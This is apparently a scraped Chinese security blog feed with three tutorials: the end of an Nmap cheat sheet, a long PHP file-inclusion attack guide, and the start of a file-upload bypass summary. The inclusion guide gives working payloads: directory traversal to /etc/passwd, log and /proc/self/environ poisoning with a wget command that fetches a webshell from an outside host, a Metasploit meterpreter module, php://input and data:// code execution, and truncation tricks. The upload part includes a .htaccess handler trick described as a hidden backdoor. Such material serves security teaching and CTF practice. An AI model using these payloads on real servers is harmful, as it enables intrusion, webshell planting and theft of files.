plusnmap -sV -T4 -O -F --version-light 192.168.1.101/248. Quick traceroutenmap -sn --traceroute 192.168.1.1019. Regular scan nmap 192.168.1.10110. Slow comprehensive scannmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script &quot;default or (discovery and safe)&quot; 192.168.1.101</code></pre><h2 id="十-Nmap-技巧"><a href="#十-Nmap-技巧" class="headerlink" title="十. Nmap 技巧"></a>十. Nmap 技巧</h2><pre><code>1. 发送以太网数据包nmap --send-eth 192.168.1.1112. 网络层发送nmap --send-ip 192.168.1.1113. 假定拥有所有权nmap --privileged 192.168.1.1114. 在交互模式中启动nmap --interactive5. 查看 Nmap 版本号nmap -V6. 设置调试级别nmap -d (1-9) 192.168.1.1117. 跟踪发送接收的报文nmap --packet-trace -p 20-30 192.168.1.1118. 列举接口和路由nmap --iflist www.iteye.com9. 指定网络接口nmap -e eth0 192.168.1.11110. 继续中断扫描nmap -oG 1.txt -v 192.168.126.1/24nmap --resume 1.txt (继续扫描)11. Dnmapdnmap_server -f test (指定命令脚本)dnmap_client -s 192.168.1.107 -a test12. 编写 Nse 脚本    (1)    -- The scanning module --        author = &quot;Wing&quot;        categories = {&quot;version&quot;}        portrule = function(host,port)            return port.protocol == &quot;tcp&quot; and port.number == 80 and port.state == &quot;open&quot;        end        action = function(host,port)            return &quot;Found!!!&quot;        end    (2) -- The scanning module --        author = &quot;Wing&quot;        categories = {&quot;version&quot;}        local comm=require &quot;comm&quot;        require &quot;shortport&quot;        local http=require &quot;http&quot;        portrule = function(host,port)            return (port.number == 80) and (port.start==&quot;open&quot;)        end        action = function(host,port)            local uri = &quot;/admin.php&quot;            local response = http.get(host,port,uri)            return &quot;Found!!!&quot;        end13. 探测防火墙nmap --script=firewalk --traceroute 192.168.1.11114. VMware认证破解nmap -p 902 --script vmauthd-brute 192.168.1.107</code></pre><h2 id="十一-Nmap的保存和输出"><a href="#十一-Nmap的保存和输出" class="headerlink" title="十一. Nmap的保存和输出"></a>十一. Nmap的保存和输出</h2><pre><code>1. 标准保存nmap -F -oN d:/test1.txt 192.168.1.1112. XML保存nmap -F -oX d:/test1.xml 192.168.1.1113. 133t 保存nmap -F -oS d:/test2.txt 192.168.1.1114. Grep 保存nmap -F -oG d:/test2.txt 192.168.1.1115. 保存到所有格式nmap -F -oA d:/test2 192.168.1.1116. 补充保存文件nmap -F -append-output -oN d:/test2.txt 192.168.1.1117. 转换 XML 保存nmap -F -oX testB.xml --stylesheet http://www.insecure.org/nmap/data/nmap.xsl 192.168.1.1118. 忽略 XML 声明的 XSL 样式表nmap -oX d:/testC.xml --no-stylesheet 192.168.1.111</code></pre>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php文件包含漏洞</title>
      <link href="/archives/844a29d4/"/>
      <url>/archives/844a29d4/</url>
      
        <content type="html"><![CDATA[<h1 id="php文件包含漏洞"><a href="#php文件包含漏洞" class="headerlink" title="php文件包含漏洞"></a>php文件包含漏洞</h1><p>[TOC]</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p><p>php中引发文件包含漏洞的通常是以下四个函数：</p><ol><li><a href="http://www.php.net/manual/en/function.include.php" target="_blank" rel="external">include()</a>   当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</li><li><a href="http://php.net/manual/en/function.include-once.php" target="_blank" rel="external">include_once()</a>   功能和include()相同，区别在于当重复调用同一文件时，程序只调用一次。</li><li><a href="http://php.net/manual/en/function.require.php" target="_blank" rel="external">require()</a>  只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</li><li><a href="http://php.net/manual/en/function.require-once.php" target="_blank" rel="external">require_once()</a> 它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</li></ol><p>当使用这四个函数包含一个新文件时，该文件将作为PHP代码执行，php内核并不在意该被包含的文件是什么类型。所以如果被包含的是txt文件、图片文件、远程url、也都将作为PHP代码执行。这一特性，在实施攻击时非常有用。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>(1)include等函数通过动态执行变量的方式引入需要包含的文件；</p><p>(2)用户能控制该动态变量。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>文件包含漏洞可以分为RFI(远程文件包含)和LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是php.ini中是否开启了allow_url_include。如果开启 了我们就有可能包含远程文件。</p><p>1、本地文件包含LFI(Local File Include)</p><p> 2、远程文件包含RFI(Remote File Include)（需要php.ini中allow_url_include=on  allow_url_fopen = On）</p><p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p><h2 id="一、本地包含"><a href="#一、本地包含" class="headerlink" title="一、本地包含"></a>一、本地包含</h2><h3 id="包含同目录下的文件"><a href="#包含同目录下的文件" class="headerlink" title="包含同目录下的文件"></a>包含同目录下的文件</h3><p>?file=test.txt</p><h3 id="目录遍历："><a href="#目录遍历：" class="headerlink" title="目录遍历："></a>目录遍历：</h3><p>?file=./../../test.txt<br>./当前目录,../上一级目录,这样的遍历目录来读取文件</p><h3 id="包含图片木马"><a href="#包含图片木马" class="headerlink" title="包含图片木马"></a>包含图片木马</h3><p>命令行下执行：<code>copy x.jpg /b + s.php /b f.jpg</code></p><p>上传 f.jpg</p><p>找到 f.jpg 路径</p><p>包含 f.jpg</p><h3 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h3><p>利用条件： 需要知道服务器日志的存储路径，且日志文件可读。</p><p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p><p>apache服务器的默认日志地址为：<code>/var/log/apache2/access.log</code></p><p>nginx服务器的默认日志地址为：<code>/var/log/nginx/access.log</code></p><p>?file=/etc/httpd/httpd.conf</p><p>可以找到errorlog的位置。</p><p>构造url为：<code>http://xxxx/&lt;?php phpinfo();?&gt;</code>，请求之后，包含日志文件</p><p>include(‘/var/log/apache2/access.log’)，从而成功执行php代码</p><p> ?file=../../../../../../../../../var/log/apache/error.log </p><p>1.</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804032017_676.png" alt=""></p><p>​   </p><p>2.可以尝试利用UA插入payload到日志文件</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804032021_793.png" alt=""></p><p>3.MSF攻击模块</p><pre><code>use exploit/unix/webapp/php_includeset rhost 192.168.159.128set rport 80set phpuri /index.php?file=xxLFIxxset path http://172.18.176.147/set payload php/meterpreter/bind_tcpset srvport 8888exploit -z</code></pre><p><strong>日志默认路径</strong></p><p>(1) apache+Linux日志默认路径</p><pre><code>/etc/httpd/logs/access_log</code></pre><p>或者</p><pre><code>/var/log/httpd/access log</code></pre><p> (2) apache+win2003日志默认路径</p><pre><code>D:xamppapachelogsaccess.logD:xamppapachelogserror.log</code></pre><p>(3) IIS6.0+win2003默认日志文件</p><pre><code>C:WINDOWSsystem32Logfiles</code></pre><p>(4) IIS7.0+win2003 默认日志文件</p><pre><code>%SystemDrive%inetpublogsLogFiles</code></pre><p>(5) nginx 日志文件在用户安装目录的logs目录下</p><p>如安装目录为/usr/local/nginx,则日志目录就是在/usr/local/nginx/logs里</p><p>也可通过其配置文件Nginx.conf，获取到日志的存在路径（/opt/nginx/logs/access.log）</p><p><strong>2）web中间件默认配置</strong></p><p> (1) apache+linux 默认配置文件</p><pre><code>/etc/httpd/conf/httpd.conf</code></pre><p>或者</p><pre><code>index.php?page=/etc/init.d/httpd</code></pre><p>(2) IIS6.0+win2003 配置文件</p><p>C:/Windows/system32/inetsrv/metabase.xml </p><p>(3) IIS7.0+WIN 配置文件</p><p>C:WindowsSystem32inetsrvconfigapplicationHost.config</p><h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><p>利用条件：session文件路径已知，且其中内容部分可控。</p><p>PHP默认生成的Session文件往往存放在/tmp目录下<br>/tmp/sess_SESSIONID</p><p>/var/lib/php/session/sess_SESSIONID</p><p>?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7</p><p>（session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell）</p><h3 id="包含-proc-self-environ文件"><a href="#包含-proc-self-environ文件" class="headerlink" title="包含/proc/self/environ文件"></a>包含/proc/self/environ文件</h3><p>利用条件：</p><ol><li>php以cgi方式运行，这样environ才会保持UA头。</li><li>environ文件存储位置已知，且environ文件可读。</li></ol><p>姿势：</p><p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p><p>?file=../../../../../../../proc/self/environ</p><p>选择User-Agent 写代码如下：</p><pre><code>&lt;?system(&#39;wget http://www.yourweb.com/oneword.txt -O shell.php&#39;);?&gt;</code></pre><p>然后提交请求。</p><h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201805140916_975.png" alt=""></p><p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p><p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。另一种方法phpinfo来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要竞争时间包含临时文件拿到webshell。</p><h2 id="有防御的本地文件包含"><a href="#有防御的本地文件包含" class="headerlink" title="有防御的本地文件包含"></a>有防御的本地文件包含</h2><p>文件名后缀固定：在包含的文件名后加固定后缀</p><p>文件名过滤 :使用switch array限制可以包含的文件名</p><p>审计中可见这样的包含模版文件：</p><pre><code class="php">&lt;?php    $file = $_GET[&#39;file&#39;];    include &#39;/var/www/html/&#39;.$file.&#39;/test/test.php&#39;;?&gt;</code></pre><p>这段代码指定了前缀和后缀：这样就很“难”直接去包含前面提到的种种文件。</p><ol><li><p>%00截断</p><p> 能利用00截断的场景现在应该很少了</p><p> PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字节(\x00)将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串。</p><p> ?file=../../../../../../../../../etc/passwd%00</p><p> 文件系统获取含有换行符的文件名，会截断为../../../ect/passwd</p><p> (需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</p></li><li><p>%00截断目录遍历：</p><p> ?file=../../../../../../../../../var/www/%00<br> (需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</p></li><li><p>路径长度截断：</p><p> ?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.<br> (php版本小于5.2.8可以成功，linux需要文件名长于4096，windows需要长于256)</p><p> 利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。</p><p> 我们知道目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。<br> 而利用”./“的方式即可构造出超长目录字符串:</p></li><li><p>点号截断：</p><p> ?file=../../../../../../../../../boot.ini/………[…]…………<br> (php版本小于5.2.8可以成功，只适用windows，点号需要长于256)</p></li><li><p>编码绕过</p><p> 服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p><ul><li>利用url编码<ul><li>../<ul><li>%2e%2e%2f</li><li>..%2f</li><li>%2e%2e/  </li></ul></li><li>..\<ul><li>%2e%2e%5c</li><li>..%5c</li><li>%2e%2e\</li></ul></li></ul></li><li><p>二次编码</p><ul><li>../<ul><li>%252e%252e%252f</li></ul></li><li>..\<ul><li>%252e%252e%255c</li></ul></li></ul><p>6.~绕过</p><p>针对目录限制</p><p>？file=~/../phpinfo这样的代码。其中~就是尝试是否可以直接跳转到当前硬盘目录。在某些环境下，可达到遍历当前文件目录</p></li></ul></li></ol><h2 id="二、远程文件包含"><a href="#二、远程文件包含" class="headerlink" title="二、远程文件包含"></a>二、远程文件包含</h2><pre><code>?file=[http|https|ftp]://www.bbb.com/shell.txt（可以有三种，http、https、ftp</code></pre><h2 id="有防御的远程文件包含"><a href="#有防御的远程文件包含" class="headerlink" title="有防御的远程文件包含"></a>有防御的远程文件包含</h2><pre><code class="php">&lt;?php     $basePath = $_GET[&#39;path&#39;];    require_once $basePath . &quot;/action/m_share.php&quot;;  ?&gt;</code></pre><p>攻击者可以构造类似如下的攻击URL</p><pre><code class="url">http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php?=http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php%23</code></pre><p>产生的原理:</p><pre><code>/?path=http://localhost/test/solution.php?最终目标应用程序代码实际上执行了:require_once &quot;http://localhost/test/solution.php?/action/m_share.php&quot;;(注意，这里很巧妙，问号&quot;?&quot;后面的代码被解释成URL的querystring，这也是一种&quot;截断&quot;思想，和%00一样)攻击者可以在http://localhost/test/solution.php上模拟出相应的路径，从而使之吻合</code></pre><h2 id="PHP中的封装协议-伪协议"><a href="#PHP中的封装协议-伪协议" class="headerlink" title="PHP中的封装协议(伪协议)"></a>PHP中的封装协议(伪协议)</h2><p><a href="http://cn2.php.net/manual/zh/wrappers.php" target="_blank" rel="external">http://cn2.php.net/manual/zh/wrappers.php</a></p><pre><code>file:///var/www/html  访问本地文件系统ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt;   访问FTP(s) URLsdata://  数据流http:// — 访问 HTTP(s) URLsftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流zlib:// — 压缩流data:// — Data (RFC 2397)glob:// — 查找匹配的文件路径模式phar:// — PHP Archivessh2:// — Secure Shell 2rar:// — RARogg:// — Audio streamsexpect:// — 处理交互式的流</code></pre><h3 id="利用php流input："><a href="#利用php流input：" class="headerlink" title="利用php流input："></a>利用php流input：</h3><p>利用条件：</p><ol><li>allow_url_include = On。</li><li>对allow_url_fopen不做要求。</li></ol><pre><code>index.php?file=php://inputPOST:&lt;? phpinfo();?&gt;</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201804032124_161.png" alt=""></p><p>结果将在index.php所在文件下的文件shell.php内增加”&lt;?php phpinfo();?&gt;”一句话</p><h3 id="利用php流filter："><a href="#利用php流filter：" class="headerlink" title="利用php流filter："></a>利用php流filter：</h3><p>?file=php://filter/convert.base64-encode/resource=index.php</p><p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。</p><p>其他姿势：</p><pre><code>index.php?file=php://filter/convert.base64-encode/resource=index.php</code></pre><p>效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。</p><h3 id="利用data-URIs："><a href="#利用data-URIs：" class="headerlink" title="利用data URIs："></a>利用data URIs：</h3><p>利用条件：</p><ol><li>php版本大于等于php5.2</li><li>allow_url_fopen = On</li><li>allow_url_include = On</li></ol><p>利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中</p><pre><code>?file=data:text/plain,&lt;?php phpinfo();?&gt;?file=data:text/plain;base64,base64编码的payloadindex.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：&lt;?php phpinfo();?&gt;</code></pre><p>(需要allow_url_include=On)</p><h3 id="利用XSS执行任意代码："><a href="#利用XSS执行任意代码：" class="headerlink" title="利用XSS执行任意代码："></a>利用XSS执行任意代码：</h3><p>?file=<a href="http://127.0.0.1/path/xss.php?xss=phpcode" target="_blank" rel="external">http://127.0.0.1/path/xss.php?xss=phpcode</a></p><p>利用条件：</p><ol><li>allow_url_fopen = On</li><li>并且防火墙或者白名单不允许访问外网时，先在同站点找一个XSS漏洞，包含这个页面，就可以注入恶意代码了。条件非常极端和特殊</li></ol><h3 id="glob-伪协议"><a href="#glob-伪协议" class="headerlink" title="glob://伪协议"></a>glob://伪协议</h3><p>glob:// 查找匹配的文件路径模式</p><h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p><ol><li>php版本大于等于php5.3.0</li></ol><p>理解：</p><p>如果服务器只允许包含.php文件，后台代码为：<code>include(xxx + &#39;.php&#39;);</code>，而这个.php文件不可控。但是我们可以上传一个.txt文件，那么我们可以通过phar伪协议来包含这个文件，而且phar协议不以后缀名判断文件类型，所以我们将我们的test.php木马压缩以后改为a.txt文件上传到服务器上，之后可以构造payload：phar://a.txt/test，服务器拼接以后就成为了：phar://a.txt/test.php，即可成功包含 </p><p>姿势：</p><p>假设有个文件phpinfo.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，如下：<br><img src="http://oy0tigw51.bkt.clouddn.com/201805140917_301.png" alt=""></p><p>指定绝对路径</p><pre><code>index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt</code></pre><p>或者使用相对路径（这里test.zip就在当前目录下）</p><pre><code>index.php?file=phar://test.zip/phpinfo.txt</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201805140917_297.png" alt=""></p><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件：</p><ol><li>php版本大于等于php5.3.0</li></ol><pre><code>&lt;?php$file = $_GET[&#39;file&#39;];if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;){    include($file);}?&gt;</code></pre><p>截取过来的后面4格字符,判断是不是jpg,如果是jpg才进行包含</p><p>但使用zip协议，需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。</p><p>然后我们构造zip://php.zip#php.jpg</p><pre><code>index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23php.jpg</code></pre><p>注意事项：</p><ol><li>若是使用相对路径，则会包含失败。</li><li>协议原型：zip://archive.zip#dir/file.txt</li><li>注意url编码,因为这个#会和url协议中的#冲突</li></ol><h2 id="CTF中的文件包含套路"><a href="#CTF中的文件包含套路" class="headerlink" title="CTF中的文件包含套路"></a>CTF中的文件包含套路</h2><h3 id="php伪协议读取源码"><a href="#php伪协议读取源码" class="headerlink" title="php伪协议读取源码"></a>php伪协议读取源码</h3><p>点击login，发现链接变为：</p><pre><code>http://54.222.188.152:1/index.php?action=login.php</code></pre><p>推测文件包含 访问：</p><pre><code>http://54.222.188.152:1/index.php?action=php://filter/read=convert.base64-encode/resource=login.php</code></pre><p>得到源码</p><h3 id="贪婪包含"><a href="#贪婪包含" class="headerlink" title="贪婪包含"></a>贪婪包含</h3><p>iscc2018的一道题目</p><p>打开题目</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805140857_654.png" alt=""></p><p>查看源码<img src="http://oy0tigw51.bkt.clouddn.com/201805140858_867.png" alt=""></p><p>知道这里调用show.php?img=1.jpg  访问 并修改1的值</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805140901_199.png" alt=""></p><p>大概可以猜测 文件包含漏洞，尝试</p><pre><code class="php">img=php://filter/read=convert.base64-encode/resource=show.php</code></pre><p>但是不行</p><p>题目的坑点在于还需要包含jpg，这就是贪婪包含所在，也就是后台某处代码所致，</p><p>curl <a href="http://118.190.152.202:8006/show.php?img=php://filter/resource=jpg/resource=show.php" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/resource=jpg/resource=show.php</a></p><pre><code class="php">&lt;?phperror_reporting(0);ini_set(&#39;display_errors&#39;,&#39;Off&#39;);include(&#39;config.php&#39;);$img = $_GET[&#39;img&#39;];if(isset($img) &amp;&amp; !empty($img)){    if(strpos($img,&#39;jpg&#39;) !== false)    {        if(strpos($img,&#39;resource=&#39;) !== false &amp;&amp; preg_match(&#39;/resource=.*jpg/i&#39;,$img) === 0)        {            die(&#39;File not found.&#39;);        }        preg_match(&#39;/^php:\/\/filter.*resource=([^|]*)/i&#39;,trim($img),$matches);        if(isset($matches[1]))        {            $img = $matches[1];        }        header(&#39;Content-Type: image/jpeg&#39;);        $data = get_contents($img);        echo $data;    }    else    {        die(&#39;File not found.&#39;);    }}else{    ?&gt;    &lt;img src=&quot;1.jpg&quot;&gt;    &lt;?php}?&gt;</code></pre><ol><li>开头包含了config.php</li><li>img必须有jpg但又不能有resource=.*jpg</li><li>正则检查了并把结果填充到$matches 里去，说明我们可以使用php://filter伪协议，并且resource的值不含|，那么我们就可以用| 来分隔php 和jpg，因为正则匹配到| 就不会继续匹配后面的jpg 了，使得\$img=show.php</li></ol><p>知道了config.php再去访问明白为什么必须包含jpg</p><pre><code class="php">&lt;?phpfunction get_contents($img){        if(strpos($img,&#39;jpg&#39;) !== false)        {                return file_get_contents($img);        }        else        {                header(&#39;Content-Type: text/html&#39;);                return file_get_contents($img);        }}?&gt;</code></pre><p>最终payload:</p><p><a href="http://118.190.152.202:8006/show.php?img=php://filter/resource=../flag.php|jpg" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/resource=../flag.php|jpg</a></p><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>要求：</p><ul><li>php版本小于5.3.4</li><li>magic_quotes_gpc为off状态</li></ul><p>大多数的文件包含漏洞都是需要截断的，因为正常程序里面包含的文件代码一般是include(BASEPATH.$mod.’.php’)或者include($mod.’.php’)这样的方式，如果我们不能写入.php为扩展名的文件，那我们是需要截断来利用的</p><p>受限与gpc和addslashes等函数的过滤，另外，php5.3之后的版本全面修复了%00截断的问题</p><pre><code class="php">&lt;?phpinclude($_GET[&#39;a&#39;].&#39;.php&#39;)?&gt;</code></pre><p>上传我们的2.txt文件,请求<a href="http://localhost/test/1.php?a=2.txt%00即可执行2.txt中phpinfo的代码" target="_blank" rel="external">http://localhost/test/1.php?a=2.txt%00即可执行2.txt中phpinfo的代码</a> </p><p>列子二</p><p>漏洞文件index.php</p><pre><code>&lt;?phpif (empty($_GET[&quot;file&quot;])){    echo(&#39;../flag.php&#39;);    return;}else{    $filename=&#39;pages/&#39;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome.txt&quot;).&#39;.html&#39;;    include $filename;}?&gt;</code></pre><p>flag文件放在上层目录</p><p>这里限制了后缀名，我们需要通过截断才能访问到flag文件 利用代码：</p><pre><code>index.php?file=../../flag.php%00</code></pre><p>%00 会被解析为0x00，所以导致截断的发生 我们通过截断成功的绕过了后缀限制</p><h3 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h3><p>我们现在已经知道使用%00截断有两个条件php版本小于5.3.4和magic_quotes_gpc为off状态。 如果这时我们将magic_quotes_gpc改为on那么就不能截断了，因为开启magic_quotes_gpc后%00会被加上一个反斜杠转义掉</p><p><img src="https://pic3.zhimg.com/80/v2-4ae67b246f19f5fe0d2355c77021bfef_hd.jpg" alt="img"></p><p>那么我们这时候有没有办法绕过这个限制呢？有一个条件那就是php版本小于5.3.10 我们的代码依旧不变 漏洞文件index.php</p><pre><code>&lt;?phpif (empty($_GET[&quot;file&quot;])){    echo(&#39;../flag.php&#39;);    return;}else{    $filename=&#39;pages/&#39;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome.txt&quot;).&#39;.html&#39;;    include $filename;}?&gt;</code></pre><p>flag文件放在上层目录 这时我们可以使用字符 .    /.   和  ./  来进行绕过，因为文件路径有长度限制</p><ul><li>windows 259个bytes</li><li>linux 4096个bytes</li></ul><p>在windows下需要.字符最少的利用POC1：</p><pre><code>file=../../flag.php..............................................................................................................................................................................................................................................</code></pre><p><img src="https://pic2.zhimg.com/80/v2-727b4d978c8ed0f1676673c26851761d_hd.jpg" alt="img"></p><p>在windows下需要.字符最少的利用POC2：</p><pre><code>file=../../flag.php./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</code></pre><p><img src="https://pic1.zhimg.com/80/v2-9ca3a3374552ee9db6dc65c999b21a3a_hd.jpg" alt="img"></p><p>将flag.php改为flag1.php 在windows下需要.字符最少的利用POC3：</p><pre><code>file=../../flag1.php/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</code></pre><p><img src="https://pic4.zhimg.com/80/v2-a9471dd64354a01407e18a5a1cccb2b9_hd.jpg" alt="img"></p><p>我们发现在使用payload3时将文件名改为了flag1.php，而payload2和payload3则是一个.开始，一个/开始。 这和文件长度的奇偶性有关，当为偶数的时候我们选择payload2，为奇数的时候我们选择payload3</p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>file_get_contents最常见的文件读取函数</p><p>?dir=/data/web.config</p><h2 id="文件包含利用方式整理"><a href="#文件包含利用方式整理" class="headerlink" title="文件包含利用方式整理"></a>文件包含利用方式整理</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201806161007_364.png" alt=""></p><h2 id="中间件安全配置"><a href="#中间件安全配置" class="headerlink" title="中间件安全配置"></a>中间件安全配置</h2><ul><li>magic_qutes_gpc</li><li>限制访问区域</li><li>设置访问权限</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201806161021_780.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> WebSecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>文件上传总结</title>
      <link href="/archives/ea42f6a6/"/>
      <url>/archives/ea42f6a6/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传总结"><a href="#文件上传总结" class="headerlink" title="文件上传总结"></a>文件上传总结</h1><h2 id="0x00-上传检测流程概述"><a href="#0x00-上传检测流程概述" class="headerlink" title="0x00 上传检测流程概述"></a>0x00 上传检测流程概述</h2><p>一个文件以http协议上传的时候，将以post请求发送至web服务器。服务器接受并同意后，用户与web服务器建立连接，并且传输数据而一般文件上传过程中检测部分由</p><ul><li>A 客户端javascript检测 （检测文件扩展名）</li><li>B 服务端MIME类型检测 （检测Content—Type）</li><li>C 服务端目录路径检测（检测和path相关参数）</li><li>D 服务端文件扩展名检测 （检测文件扩展名）</li><li>E 服务端内容检测 （检测是否含有恶意代码）0x01 客户端检测绕过(javascript 检测)</li></ul><h2 id="0x01-客户端检测绕过检测-（js检测）"><a href="#0x01-客户端检测绕过检测-（js检测）" class="headerlink" title="0x01 客户端检测绕过检测 （js检测）"></a>0x01 客户端检测绕过检测 （js检测）</h2><h2 id="0x02-服务端检测绕过-MIME-类型检测"><a href="#0x02-服务端检测绕过-MIME-类型检测" class="headerlink" title="0x02 服务端检测绕过(MIME 类型检测)"></a>0x02 服务端检测绕过(MIME 类型检测)</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201804071824_866.png" alt=""></p><h2 id="0x03-服务端检测绕过-目录路径检测"><a href="#0x03-服务端检测绕过-目录路径检测" class="headerlink" title="0x03 服务端检测绕过(目录路径检测)"></a>0x03 服务端检测绕过(目录路径检测)</h2><h2 id="0x04-服务端检测绕过-文件扩展名检测"><a href="#0x04-服务端检测绕过-文件扩展名检测" class="headerlink" title="0x04 服务端检测绕过(文件扩展名检测)"></a>0x04 服务端检测绕过(文件扩展名检测)</h2><ul><li><p>黑名单检测</p><ol><li><p>文件名大小写绕过<br>用像 AsP，pHp 之类的文件名绕过黑名单检测</p></li><li><p>名单列表绕过<br>用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类.还有php2、php3、</p></li><li><p>特殊文件名绕过<br>比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式<br>在 windows是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会<br>被 windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性。</p></li><li><p>0x00 截断绕过<br>假如这时候获取到的文件名是 test.asp .jpg(asp 后面为 0x00) 而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg<br>​</p></li><li><p>.htaccess 文件攻击<br>配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测</p><p>该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。该文件的写法如下：</p><pre><code>&lt;FilesMatch &quot;_php.gif&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>保存为.htaccess文件。该文件的意思是，只要遇到文件名中包含有”_php.gif”字符串的，统一按照php文件来执行。该文件在Apache里默认是启用的，如果没启用，启用方法见：<a href="http://www.jb51.net/article/25476.htm" target="_blank" rel="external">http://www.jb51.net/article/25476.htm</a> 然后就可以上传一个带一句话木马的文件，例如a_php.gif，会被当成php执行。该方法其实不是漏洞，是Apache的特性。该方法常用于黑客入侵网站之后，不想被发现，留一个隐蔽的后门。在PHP手册中提到一句话，move_uploaded_file section,there is awarning which states‘If the destination file already exists, it will be 